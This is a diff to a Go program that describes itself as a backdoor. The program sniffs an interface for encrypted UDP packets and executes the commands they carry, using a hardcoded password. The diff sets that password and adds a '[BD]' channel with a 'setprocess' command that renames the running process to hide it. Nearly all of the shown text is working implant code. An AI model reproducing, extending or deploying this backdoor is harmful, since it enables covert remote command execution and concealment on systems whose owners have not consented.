@@ -19,7 +19,7 @@ import(
 	"net"
 )
 
-const passwd = "D";
+const passwd = "DAMNPANDIMENSIONALMICE";
 var authenticatedAddr string;
 
 func main(){
@@ -33,7 +33,8 @@ func main(){
 	portPtr := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
 	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
 	lPortPtr := flag.Int("lport", 3321, "The port for the client to listen on.");
-
+	//flags
+	
 	flag.Parse();
 
 	intiateTools();
@@ -77,15 +78,18 @@ func intiateClient(ip string, port, lport int){
 		reader := bufio.NewReader(os.Stdin);
 		input, _ := reader.ReadString('\n');
 		input = strings.TrimSpace(input);
-		
-		sendEncryptedData(port, "[EXEC]" + input, ip);
+		if strings.HasPrefix(input, "!") {
+			sendEncryptedData(port, "[BD]" + input, ip);
+		} else {
+			sendEncryptedData(port, "[EXEC]" + input, ip);
+		}
 		grabOutput(serverConn);
 	}
 }
 
 func grabOutput(serverConn *net.UDPConn) {
 	
-	buf := make([]byte, 1024)
+	buf := make([]byte, 65536);
 	for {
 		n,_,err := serverConn.ReadFromUDP(buf)
 		if err != nil {
@@ -93,7 +97,7 @@ func grabOutput(serverConn *net.UDPConn) {
 		}
 
 		data := decrypt_data(buf[0:n]);
-
+		
 		if strings.HasSuffix(data, "[END]"){
 			fmt.Printf("%s", data[0:(n-5)]);
 			break;
@@ -135,6 +139,9 @@ func handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
 		if strings.HasPrefix(data, "[EXEC]") {
 			executeCommand(data, ipLayer.SrcIP.String(), port);
 		}
+		if strings.HasPrefix(data, "[BD]") {
+			executeServerCommand(data, ipLayer.SrcIP.String(), port);
+		}
 
 	}else if lport == int(udpLayer.DstPort) {
 		data := decrypt_data([]byte(udpLayer.Payload));
@@ -143,6 +150,32 @@ func handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
 			authenticatedAddr = ipLayer.SrcIP.String();
 		}
 	}
+}
+
+func executeServerCommand(data, ip string, port int) {
+
+	fmt.Printf("%s\n", data);
+
+	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
+	args := strings.Split(tempstr[1], " ");
+
+	var out string;
+	
+	if args[0] == "setprocess" {
+		err := SetProcessName(args[1]);
+		if err != nil {
+			fmt.Printf("%s\n", err);
+			out = fmt.Sprintf("%s", err);
+		} else {
+			out = fmt.Sprintf("Process name set to %s\n", args[1]);
+		}
+	} else {
+		out = "Not a valid command.\n";
+	}
+
+	fmt.Printf("%s", out);
+
+	sendEncryptedData(port, out + "[END]", ip);	
 }
 /*
 
